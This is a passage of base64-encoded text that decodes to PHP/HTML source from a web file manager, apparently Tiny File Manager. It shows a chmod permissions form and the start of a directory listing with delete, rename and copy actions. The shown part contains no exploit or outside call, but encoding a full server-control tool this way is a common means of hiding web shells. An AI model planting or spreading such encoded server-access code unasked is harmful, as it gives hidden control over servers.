JmFtcDtlZGl0PTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlKSA/PiI+PGkgY2xhc3M9ImZhIGZhLXRleHQtaGVpZ2h0Ij48L2k+IDw/cGhwIGVjaG8gbG5nKCdOb3JtYWxFZGl0b3InKSA/PjwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1vdXRsaW5lLXByaW1hcnkiIG5hbWU9IlNhdmUiIGRhdGEtdXJsPSI8P3BocCBlY2hvIGZtX2VuYygkZmlsZV91cmwpID8+IiBvbmNsaWNrPSJlZGl0X3NhdmUodGhpcywnYWNlJykiPjxpIGNsYXNzPSJmYSBmYS1mbG9wcHktbyI+PC9pPiA8P3BocCBlY2hvIGxuZygnU2F2ZScpID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgIDw/cGhwIH0gPz4KICAgICAgICAgICAgICAgIDw/cGhwIH0gPz4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPD9waHAKICAgICAgICBpZiAoJGlzX3RleHQgJiYgJGlzTm9ybWFsRWRpdG9yKSB7CiAgICAgICAgICAgIGVjaG8gJzx0ZXh0YXJlYSBjbGFzcz0ibXQtMiIgaWQ9Im5vcm1hbC1lZGl0b3IiIHJvd3M9IjMzIiBjb2xzPSIxMjAiIHN0eWxlPSJ3aWR0aDogOTkuNSU7Ij4nIC4gaHRtbHNwZWNpYWxjaGFycygkY29udGVudCkgLiAnPC90ZXh0YXJlYT4nOwogICAgICAgIH0gZWxzZWlmICgkaXNfdGV4dCkgewogICAgICAgICAgICBlY2hvICc8ZGl2IGlkPSJlZGl0b3IiIGNvbnRlbnRlZGl0YWJsZT0idHJ1ZSI+JyAuIGh0bWxzcGVjaWFsY2hhcnMoJGNvbnRlbnQpIC4gJzwvZGl2Pic7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZm1fc2V0X21zZygnRklMRSBFWFRFTlNJT04gSEFTIE5PVCBTVVBQT1JURUQnLCAnZXJyb3InKTsKICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2PgogICAgPD9waHAKICAgIGZtX3Nob3dfZm9vdGVyKCk7CiAgICBleGl0Owp9CgovLyBjaG1vZCAobm90IGZvciBXaW5kb3dzKQppZiAoaXNzZXQoJF9HRVRbJ2NobW9kJ10pICYmICFGTV9SRUFET05MWSAmJiAhRk1fSVNfV0lOKSB7CiAgICAkZmlsZSA9ICRfR0VUWydjaG1vZCddOwogICAgJGZpbGUgPSBmbV9jbGVhbl9wYXRoKCRmaWxlKTsKICAgICRmaWxlID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJGZpbGUpOwogICAgaWYgKCRmaWxlID09ICcnIHx8ICghaXNfZmlsZSgkcGF0aCAuICcvJyAuICRmaWxlKSAmJiAhaXNfZGlyKCRwYXRoIC4gJy8nIC4gJGZpbGUpKSkgewogICAgICAgIGZtX3NldF9tc2coJ0ZpbGUgbm90IGZvdW5kJywgJ2Vycm9yJyk7CiAgICAgICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZShGTV9QQVRIKSk7CiAgICB9CgogICAgZm1fc2hvd19oZWFkZXIoKTsgLy8gSEVBREVSCiAgICBmbV9zaG93X25hdl9wYXRoKEZNX1BBVEgpOyAvLyBjdXJyZW50IHBhdGgKCiAgICAkZmlsZV91cmwgPSBGTV9ST09UX1VSTCAuIChGTV9QQVRIICE9ICcnID8gJy8nIC4gRk1fUEFUSCA6ICcnKSAuICcvJyAuICRmaWxlOwogICAgJGZpbGVfcGF0aCA9ICRwYXRoIC4gJy8nIC4gJGZpbGU7CgogICAgJG1vZGUgPSBmaWxlcGVybXMoJHBhdGggLiAnLycgLiAkZmlsZSk7CgogICAgPz4KICAgIDxkaXYgY2xhc3M9InBhdGgiPgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQgbWItMiA8P3BocCBlY2hvIGZtX2dldF90aGVtZSgpOyA/PiI+CiAgICAgICAgICAgIDxoNiBjbGFzcz0iY2FyZC1oZWFkZXIiPgogICAgICAgICAgICAgICAgPD9waHAgZWNobyBsbmcoJ0NoYW5nZVBlcm1pc3Npb25zJykgPz4KICAgICAgICAgICAgPC9oNj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJjYXJkLXRleHQiPgogICAgICAgICAgICAgICAgICAgIEZ1bGwgcGF0aDogPD9waHAgZWNobyAkZmlsZV9wYXRoID8+PGJyPgogICAgICAgICAgICAgICAgPC9wPgogICAgICAgICAgICAgICAgPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icCIgdmFsdWU9Ijw/cGhwIGVjaG8gZm1fZW5jKEZNX1BBVEgpID8+Ij4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjaG1vZCIgdmFsdWU9Ijw/cGhwIGVjaG8gZm1fZW5jKCRmaWxlKSA/PiI+CgogICAgICAgICAgICAgICAgICAgIDx0YWJsZSBjbGFzcz0idGFibGUgY29tcGFjdC10YWJsZSA8P3BocCBlY2hvIGZtX2dldF90aGVtZSgpOyA/PiI+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0cj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48L3RkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxiPjw/cGhwIGVjaG8gbG5nKCdPd25lcicpID8+PC9iPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGI+PD9waHAgZWNobyBsbmcoJ0dyb3VwJykgPz48L2I+PC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48Yj48P3BocCBlY2hvIGxuZygnT3RoZXInKSA/PjwvYj48L3RkPgogICAgICAgICAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQgc3R5bGU9InRleHQtYWxpZ246IHJpZ2h0Ij48Yj48P3BocCBlY2hvIGxuZygnUmVhZCcpID8+PC9iPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGxhYmVsPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0idXIiIHZhbHVlPSIxIjw/cGhwIGVjaG8gKCRtb2RlICYgMDA0MDApID8gJyBjaGVja2VkJyA6ICcnID8+PjwvbGFiZWw+PC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48bGFiZWw+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJnciIgdmFsdWU9IjEiPD9waHAgZWNobyAoJG1vZGUgJiAwMDA0MCkgPyAnIGNoZWNrZWQnIDogJycgPz4+PC9sYWJlbD48L3RkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxsYWJlbD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im9yIiB2YWx1ZT0iMSI8P3BocCBlY2hvICgkbW9kZSAmIDAwMDA0KSA/ICcgY2hlY2tlZCcgOiAnJyA/Pj48L2xhYmVsPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0cj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBzdHlsZT0idGV4dC1hbGlnbjogcmlnaHQiPjxiPjw/cGhwIGVjaG8gbG5nKCdXcml0ZScpID8+PC9iPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGxhYmVsPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0idXciIHZhbHVlPSIxIjw/cGhwIGVjaG8gKCRtb2RlICYgMDAyMDApID8gJyBjaGVja2VkJyA6ICcnID8+PjwvbGFiZWw+PC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48bGFiZWw+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJndyIgdmFsdWU9IjEiPD9waHAgZWNobyAoJG1vZGUgJiAwMDAyMCkgPyAnIGNoZWNrZWQnIDogJycgPz4+PC9sYWJlbD48L3RkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxsYWJlbD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im93IiB2YWx1ZT0iMSI8P3BocCBlY2hvICgkbW9kZSAmIDAwMDAyKSA/ICcgY2hlY2tlZCcgOiAnJyA/Pj48L2xhYmVsPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0cj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBzdHlsZT0idGV4dC1hbGlnbjogcmlnaHQiPjxiPjw/cGhwIGVjaG8gbG5nKCdFeGVjdXRlJykgPz48L2I+PC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48bGFiZWw+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJ1eCIgdmFsdWU9IjEiPD9waHAgZWNobyAoJG1vZGUgJiAwMDEwMCkgPyAnIGNoZWNrZWQnIDogJycgPz4+PC9sYWJlbD48L3RkPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxsYWJlbD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Imd4IiB2YWx1ZT0iMSI8P3BocCBlY2hvICgkbW9kZSAmIDAwMDEwKSA/ICcgY2hlY2tlZCcgOiAnJyA/Pj48L2xhYmVsPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGxhYmVsPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ib3giIHZhbHVlPSIxIjw/cGhwIGVjaG8gKCRtb2RlICYgMDAwMDEpID8gJyBjaGVja2VkJyA6ICcnID8+PjwvbGFiZWw+PC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgICAgICAgICA8L3RhYmxlPgoKICAgICAgICAgICAgICAgICAgICA8cD4KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXN1Y2Nlc3MiPjxpIGNsYXNzPSJmYSBmYS1jaGVjay1jaXJjbGUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0NoYW5nZScpID8+PC9idXR0b24+ICZuYnNwOwogICAgICAgICAgICAgICAgICAgICAgICA8Yj48YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiIgY2xhc3M9ImJ0biBidG4tb3V0bGluZS1wcmltYXJ5Ij48aSBjbGFzcz0iZmEgZmEtdGltZXMtY2lyY2xlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdDYW5jZWwnKSA/PjwvYT48L2I+CiAgICAgICAgICAgICAgICAgICAgPC9wPgogICAgICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPD9waHAKICAgIGZtX3Nob3dfZm9vdGVyKCk7CiAgICBleGl0Owp9CgovLy0tLSBGSUxFTUFOQUdFUiBNQUlOCmZtX3Nob3dfaGVhZGVyKCk7IC8vIEhFQURFUgpmbV9zaG93X25hdl9wYXRoKEZNX1BBVEgpOyAvLyBjdXJyZW50IHBhdGgKCi8vIG1lc3NhZ2VzCmZtX3Nob3dfbWVzc2FnZSgpOwoKJG51bV9maWxlcyA9IGNvdW50KCRmaWxlcyk7CiRudW1fZm9sZGVycyA9IGNvdW50KCRmb2xkZXJzKTsKJGFsbF9maWxlc19zaXplID0gMDsKJHRhYmxlVGhlbWUgPSAoRk1fVEhFTUUgPT0gImRhcmsiKSA/ICJ0ZXh0LXdoaXRlIGJnLWRhcmsgdGFibGUtZGFyayIgOiAiYmctd2hpdGUiOwo/Pgo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBjbGFzcz0icHQtMyI+CiAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwIiB2YWx1ZT0iPD9waHAgZWNobyBmbV9lbmMoRk1fUEFUSCkgPz4iPgogICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZ3JvdXAiIHZhbHVlPSIxIj4KICAgIDxkaXYgY2xhc3M9InRhYmxlLXJlc3BvbnNpdmUiPgogICAgICAgIDx0YWJsZSBjbGFzcz0idGFibGUgdGFibGUtYm9yZGVyZWQgdGFibGUtaG92ZXIgdGFibGUtc20gPD9waHAgZWNobyAkdGFibGVUaGVtZTsgPz4iIGlkPSJtYWluLXRhYmxlIj4KICAgICAgICAgICAgPHRoZWFkIGNsYXNzPSJ0aGVhZC13aGl0ZSI+CiAgICAgICAgICAgIDx0cj4KICAgICAgICAgICAgICAgIDw/cGhwIGlmICghRk1fUkVBRE9OTFkpOiA/PgogICAgICAgICAgICAgICAgICAgIDx0aCBzdHlsZT0id2lkdGg6MyUiIGNsYXNzPSJjdXN0b20tY2hlY2tib3gtaGVhZGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY3VzdG9tLWNvbnRyb2wgY3VzdG9tLWNoZWNrYm94Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgY2xhc3M9ImN1c3RvbS1jb250cm9sLWlucHV0IiBpZD0ianMtc2VsZWN0LWFsbC1pdGVtcyIgb25jbGljaz0iY2hlY2tib3hfdG9nZ2xlKCkiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJjdXN0b20tY29udHJvbC1sYWJlbCIgZm9yPSJqcy1zZWxlY3QtYWxsLWl0ZW1zIj48L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L3RoPjw/cGhwIGVuZGlmOyA/PgogICAgICAgICAgICAgICAgPHRoPjw/cGhwIGVjaG8gbG5nKCdOYW1lJykgPz48L3RoPgogICAgICAgICAgICAgICAgPHRoPjw/cGhwIGVjaG8gbG5nKCdTaXplJykgPz48L3RoPgogICAgICAgICAgICAgICAgPHRoPjw/cGhwIGVjaG8gbG5nKCdNb2RpZmllZCcpID8+PC90aD4KICAgICAgICAgICAgICAgIDw/cGhwIGlmICghRk1fSVNfV0lOICYmICEkaGlkZV9Db2xzKTogPz4KICAgICAgICAgICAgICAgICAgICA8dGg+PD9waHAgZWNobyBsbmcoJ1Blcm1zJykgPz48L3RoPgogICAgICAgICAgICAgICAgICAgIDx0aD48P3BocCBlY2hvIGxuZygnT3duZXInKSA/PjwvdGg+PD9waHAgZW5kaWY7ID8+CiAgICAgICAgICAgICAgICA8dGg+PD9waHAgZWNobyBsbmcoJ0FjdGlvbnMnKSA/PjwvdGg+CiAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgIDwvdGhlYWQ+CiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICAgIC8vIGxpbmsgdG8gcGFyZW50IGZvbGRlcgogICAgICAgICAgICBpZiAoJHBhcmVudCAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgID8+CiAgICAgICAgICAgICAgICA8dHI+PD9waHAgaWYgKCFGTV9SRUFET05MWSk6ID8+CiAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJub3NvcnQiPjwvdGQ+PD9waHAgZW5kaWY7ID8+CiAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJib3JkZXItMCI+PGEgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoJHBhcmVudCkgPz4iPjxpIGNsYXNzPSJmYSBmYS1jaGV2cm9uLWNpcmNsZS1sZWZ0IGdvLWJhY2siPjwvaT4gLi48L2E+PC90ZD4KICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImJvcmRlci0wIj48L3RkPgogICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iYm9yZGVyLTAiPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJib3JkZXItMCI+PC90ZD4KICAgICAgICAgICAgICAgICAgICA8P3BocCBpZiAoIUZNX0lTX1dJTiAmJiAhJGhpZGVfQ29scykgeyA/PgogICAgICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImJvcmRlci0wIj48L3RkPgogICAgICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImJvcmRlci0wIj48L3RkPgogICAgICAgICAgICAgICAgICAgIDw/cGhwIH0gPz4KICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICA8P3BocAogICAgICAgICAgICB9CiAgICAgICAgICAgICRpaSA9IDMzOTk7CiAgICAgICAgICAgIGZvcmVhY2ggKCRmb2xkZXJzIGFzICRmKSB7CiAgICAgICAgICAgICAgICAkaXNfbGluayA9IGlzX2xpbmsoJHBhdGggLiAnLycgLiAkZik7CiAgICAgICAgICAgICAgICAkaW1nID0gJGlzX2xpbmsgPyAnaWNvbi1saW5rX2ZvbGRlcicgOiAnZmEgZmEtZm9sZGVyLW8nOwogICAgICAgICAgICAgICAgJG1vZGlmX3JhdyA9IGZpbGVtdGltZSgkcGF0aCAuICcvJyAuICRmKTsKICAgICAgICAgICAgICAgICRtb2RpZiA9IGRhdGUoRk1fREFURVRJTUVfRk9STUFULCAkbW9kaWZfcmF3KTsKICAgICAgICAgICAgICAgIGlmICgkY2FsY19mb2xkZXIpIHsKICAgICAgICAgICAgICAgICAgICAkZmlsZXNpemVfcmF3ID0gZm1fZ2V0X2RpcmVjdG9yeXNpemUoJHBhdGggLiAnLycgLiAkZik7CiAgICAgICAgICAgICAgICAgICAgJGZpbGVzaXplID0gZm1fZ2V0X2ZpbGVzaXplKCRmaWxlc2l6ZV9yYXcpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJGZpbGVzaXplX3JhdyA9ICIiOwogICAgICAgICAgICAgICAgICAgICRmaWxlc2l6ZSA9IGxuZygnRm9sZGVyJyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkcGVybXMgPSBzdWJzdHIoZGVjb2N0KGZpbGVwZXJtcygkcGF0aCAuICcvJyAuICRmKSksIC00KTsKICAgICAgICAgICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldHB3dWlkJykgJiYgZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRncmdpZCcpKSB7CiAgICAgICAgICAgICAgICAgICAgJG93bmVyID0gcG9zaXhfZ2V0cHd1aWQoZmlsZW93bmVyKCRwYXRoIC4gJy8nIC4gJGYpKTsKICAgICAgICAgICAgICAgICAgICAkZ3JvdXAgPSBwb3NpeF9nZXRncmdpZChmaWxlZ3JvdXAoJHBhdGggLiAnLycgLiAkZikpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkb3duZXIgPSBhcnJheSgnbmFtZScgPT4gJz8nKTsKICAgICAgICAgICAgICAgICAgICAkZ3JvdXAgPSBhcnJheSgnbmFtZScgPT4gJz8nKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgID8+CiAgICAgICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCFGTV9SRUFET05MWSk6ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iY3VzdG9tLWNoZWNrYm94LXRkIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY3VzdG9tLWNvbnRyb2wgY3VzdG9tLWNoZWNrYm94Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgY2xhc3M9ImN1c3RvbS1jb250cm9sLWlucHV0IiBpZD0iPD9waHAgZWNobyAkaWkgPz4iIG5hbWU9ImZpbGVbXSIgdmFsdWU9Ijw/cGhwIGVjaG8gZm1fZW5jKCRmKSA/PiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImN1c3RvbS1jb250cm9sLWxhYmVsIiBmb3I9Ijw/cGhwIGVjaG8gJGlpID8+Ij48L2xhYmVsPgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC90ZD48P3BocCBlbmRpZjsgPz4KICAgICAgICAgICAgICAgICAgICA8dGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZpbGVuYW1lIj48YSBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEggLiAnLycgLiAkZiwgJy8nKSkgPz4iPjxpIGNsYXNzPSI8P3BocCBlY2hvICRpbWcgPz4iPjwvaT4gPD9waHAgZWNobyBmbV9jb252ZXJ0X3dpbihmbV9lbmMoJGYpKSA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPjw/cGhwIGVjaG8oJGlzX2xpbmsgPyAnICZyYXJyOyA8aT4nIC4gcmVhZGxpbmsoJHBhdGggLiAnLycgLiAkZikgLiAnPC9pPicgOiAnJykgPz48L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L3RkPgogICAgICAgICAgICAgICAgICAgIDx0ZCBkYXRhLXNvcnQ9ImEtPD9waHAgZWNobyBzdHJfcGFkKCRmaWxlc2l6ZV9yYXcsIDE4LCAiMCIsIFNUUl9QQURfTEVGVCk7Pz4iPgogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvICRmaWxlc2l6ZTsgPz4KICAgICAgICAgICAgICAgICAgICA8L3RkPgogICAgICAgICAgICAgICAgICAgIDx0ZCBkYXRhLXNvcnQ9ImEtPD9waHAgZWNobyAkbW9kaWZfcmF3Oz8+Ij48P3BocCBlY2hvICRtb2RpZiA/PjwvdGQ+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCFGTV9JU19XSU4gJiYgISRoaWRlX0NvbHMpOiA/PgogICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PD9waHAgaWYgKCFGTV9SRUFET05MWSk6ID8+PGEgdGl0bGU9IkNoYW5nZSBQZXJtaXNzaW9ucyIgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO2NobW9kPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmKSA/PiI+PD9waHAgZWNobyAkcGVybXMgPz48L2E+PD9waHAgZWxzZTogPz48P3BocCBlY2hvICRwZXJtcyA/Pjw/cGhwIGVuZGlmOyA/PgogICAgICAgICAgICAgICAgICAgICAgICA8L3RkPgogICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PD9waHAgZWNobyAkb3duZXJbJ25hbWUnXSAuICc6JyAuICRncm91cFsnbmFtZSddID8+PC90ZD4KICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4KICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImlubGluZS1hY3Rpb25zIj48P3BocCBpZiAoIUZNX1JFQURPTkxZKTogPz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnRGVsZXRlJyk/PiIgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO2RlbD08P3BocCBlY2hvIHVybGVuY29kZSgkZikgPz4iIG9uY2xpY2s9InJldHVybiBjb25maXJtKCc8P3BocCBlY2hvIGxuZygnRGVsZXRlJykuJyAnLmxuZygnRm9sZGVyJykuJz8nOyA/PlxuIFxuICggPD9waHAgZWNobyB1cmxlbmNvZGUoJGYpID8+ICknKTsiPiA8aSBjbGFzcz0iZmEgZmEtdHJhc2gtbyIgYXJpYS1oaWRkZW49InRydWUiPjwvaT48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ1JlbmFtZScpPz4iIGhyZWY9IiMiIG9uY2xpY2s9InJlbmFtZSgnPD9waHAgZWNobyBmbV9lbmMoRk1fUEFUSCkgPz4nLCAnPD9waHAgZWNobyBmbV9lbmMoYWRkc2xhc2hlcygkZikpID8+Jyk7cmV0dXJuIGZhbHNlOyI+PGkgY2xhc3M9ImZhIGZhLXBlbmNpbC1zcXVhcmUtbyIgYXJpYS1oaWRkZW49InRydWUiPjwvaT48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ0NvcHlUbycpPz4uLi4iIGhyZWY9Ij9wPSZhbXA7Y29weT08P3BocCBlY2hvIHVybGVuY29kZSh0cmltKEZNX1BBVEggLiAnLycgLiAkZiwgJy8nKSkgPz4iPjxpIGNsYXNzPSJmYSBmYS1maWxlcy1vIiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPjwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZW5kaWY7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnRGlyZWN0TGluaycpPz4iIGhyZWY9Ijw/cGhwIGVjaG8gZm1fZW5jKEZNX1JPT1RfVVJMIC4gKEZNX1BBVEggIT0gJycgPyAnLycgLiBGTV9QQVRIIDogJycpIC4gJy8nIC4gJGYgLiAnLycpID8+IiB0YXJnZXQ9Il9ibGFuayI+PGkgY2xhc3M9ImZhIGZhLWxpbmsiIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+PC9hPgogICAgICAgICAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgPD9waHAKICAgICAgICAgICAgICAgIGZsdXNoKCk7CiAgICAgICAgICAgICAgICAkaWkrKzsKICAgICAgICAgICAgfQogICAgICAgICAgICAkaWsgPSA2MDcwOwogICAgICAgICAgICBmb3JlYWNoICgkZmlsZXMgYXMgJGYpIHsKICAgICAgICAgICAgICAgICRpc19saW5rID0gaXNfbGluaygkcGF0aCAuICcvJyAuICRmKTsKICAgICAgICAgICAgICAgICRpbWcgPSAkaXNfbGluayA/ICdmYSBmYS1maWxlLXRleHQtbycgOiBmbV9nZXRfZmlsZV9pY29uX2NsYXNzKCRwYXRoIC4gJy8nIC4gJGYpOwogICAgICAgICAgICAgICAgJG1vZGlmX3JhdyA9IGZpbGVtdGltZSgkcGF0aCAuICcvJyAuICRmKTsKICAgICAgICAgICAgICAgICRtb2RpZiA9IGRhdGUoRk1fREFURVRJTUVfRk9STUFULCAkbW9kaWZfcmF3KTsKICAgICAgICAgICAgICAgICRmaWxlc2l6ZV9yYXcgPSBmbV9nZXRfc2l6ZSgkcGF0aCAuICcvJyAuICRmKTsKICAgICAgICAgICAgICAgICRmaWxlc2l6ZSA9IGZtX2dldF9maWxlc2l6ZSgkZmlsZXNpemVfcmF3KTsKICAgICAgICAgICAgICAgICRmaWxlbGluayA9ICc/cD0nIC4gdXJsZW5jb2RlKEZNX1BBVEgpIC4gJyZhbXA7dmlldz0nIC4gdXJsZW5jb2RlKCRmKTsKICAgICAgICAgICAgICAgICRhbGxfZmlsZXNfc2l6ZSArPSAkZmlsZXNpemVfcmF3OwogICAgICAgICAgICAgICAgJHBlcm1zID0gc3Vic3RyKGRlY29jdChmaWxlcGVybXMoJHBhdGggLiAnLycgLiAkZikpLCAtNCk7CiAgICAgICAgICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRwd3VpZCcpICYmIGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0Z3JnaWQnKSkgewogICAgICAgICAgICAgICAgICAgICRvd25lciA9IHBvc2l4X2dldHB3dWlkKGZpbGVvd25lcigkcGF0aCAuICcvJyAuICRmKSk7CiAgICAgICAgICAgICAgICAgICAgJGdyb3VwID0gcG9zaXhfZ2V0Z3JnaWQoZmlsZWdyb3VwKCRwYXRoIC4gJy8nIC4gJGYpKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJG93bmVyID0gYXJyYXkoJ25hbWUnID0+ICc/Jyk7CiAgICAgICAgICAgICAgICAgICAgJGdyb3VwID0gYXJyYXkoJ25hbWUnID0+ICc/Jyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICA/PgogICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgIDw/cGhwIGlmICghRk1fUkVBRE9OTFkpOiA/PgogICAgICAgICAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImN1c3RvbS1jaGVja2JveC10ZCI+CiAgICAgICAgICAgICAgICA